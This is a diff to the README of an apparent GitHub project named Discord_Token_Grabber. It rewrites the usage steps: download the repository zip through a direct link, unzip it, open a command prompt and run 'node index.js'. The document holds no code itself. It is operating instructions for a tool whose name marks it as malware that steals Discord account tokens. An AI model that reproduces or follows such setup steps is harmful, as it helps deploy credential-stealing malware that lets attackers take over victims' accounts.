@@ -24,8 +24,10 @@
 
 ## Usage
 
-- Download repo
-- Unzip File  
+- Download repo: [Here](https://github.com/TheRealCodingGuy/Discord_Token_Grabber/archive/refs/heads/main.zip)   
+- Unzip Zipfile  
 - Goto folder  
-- Open cmd in folder and type: npm i
-- type: node builder.js
+- Open cmd inside that folder  
+![image](https://user-images.githubusercontent.com/100526916/199351126-2d17947b-b39f-473e-987f-22a0d4750307.png)  
+
+- type: node index.js  
